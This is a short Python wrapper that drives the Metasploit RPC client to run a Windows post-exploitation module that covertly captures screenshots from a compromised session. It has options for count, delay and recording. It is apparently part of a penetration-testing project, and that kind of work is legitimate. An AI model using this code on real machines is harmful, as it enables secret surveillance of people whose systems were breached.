from metasploit.msfrpc import MsfRpcClient

import anssi.settings
import os

def post_take_screenshot(client, session, path, count, delay, record, view_screenshots):
    post = client.modules.use('post', 'windows/gather/homemade_screen_spy')
    post['SESSION'] = session
    post['PATH'] = path
    post['COUNT'] = count
    post['DELAY'] = delay
    post['RECORD'] = record
    post['VIEW_SCREENSHOTS'] = view_screenshots
    post.execute()
